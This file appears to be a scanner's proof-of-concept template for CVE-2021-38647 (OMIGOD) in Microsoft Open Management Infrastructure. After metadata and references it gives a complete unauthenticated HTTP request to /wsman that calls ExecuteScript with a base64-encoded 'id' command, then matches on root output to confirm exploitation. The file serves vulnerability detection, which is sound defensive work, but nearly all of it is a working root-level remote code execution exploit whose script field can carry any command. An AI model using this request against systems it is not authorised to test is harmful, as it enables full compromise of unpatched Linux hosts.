cves/2021/CVE-2021-38647.poc

## id: CVE-2021-38647
## name: Microsoft Open Management Infrastructure - Remote Code Execution
## author: hack007x
## severity: critical
## cve: CVE-2021-38647
## tags: cve2021,cve,rce,omi,microsoft,kev,vkev,vuln
## description: Microsoft Open Management Infrastructure is susceptible to remote code execution (OMIGOD).
## affects: Updates for this vulnerability were published on GitHub on August 11, 2021.
## cvss-score: 9.8
## reference: https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure
## reference: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647
## reference: https://attackerkb.com/topics/08O94gYdF1/cve-2021-38647
## reference: https://censys.io/blog/understanding-the-impact-of-omigod-cve-2021-38647/
## reference: https://github.com/microsoft/omi
## verification: true

POST /wsman HTTP/1.1
Host: {{Hostname}}
User-Agent: {{random_ua}}
Content-Type: application/soap+xml;charset=UTF-8

<s:Envelope
  xmlns:s="http://www.w3.org/2003/05/soap-envelope"
  xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
  xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration"
  xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema"
  xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
  xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
  <s:Header>
    <a:To>HTTP://{{Hostname}}/wsman/</a:To>
    <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
    <a:ReplyTo>
      <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
    </a:ReplyTo>
    <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteScript</a:Action>
    <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
    <a:MessageID>uuid:00B60932-CC01-0005-0000-000000010000</a:MessageID>
    <w:OperationTimeout>PT1M30S</w:OperationTimeout>
    <w:Locale xml:lang="en-us" s:mustUnderstand="false"/>
    <p:DataLocale xml:lang="en-us" s:mustUnderstand="false"/>
    <w:OptionSet s:mustUnderstand="true"/>
    <w:SelectorSet>
      <w:Selector Name="__cimnamespace">root/scx</w:Selector>
    </w:SelectorSet>
  </s:Header>
  <s:Body>
    <p:ExecuteScript_INPUT
      xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
      <p:Script>aWQ=</p:Script>
      <p:Arguments/>
      <p:timeout>0</p:timeout>
      <p:b64encoded>true</p:b64encoded>
    </p:ExecuteScript_INPUT>
  </s:Body>
</s:Envelope>

#@ condition: and
#@ matcher: body contains "<p:StdOut>"
#@ matcher: body contains "uid=0(root) gid=0(root) groups=0"





# @VEIL-STAMP: 7b205425476f53b3ed872134da09bc611db08f397d0ad23a755757f9b5792962
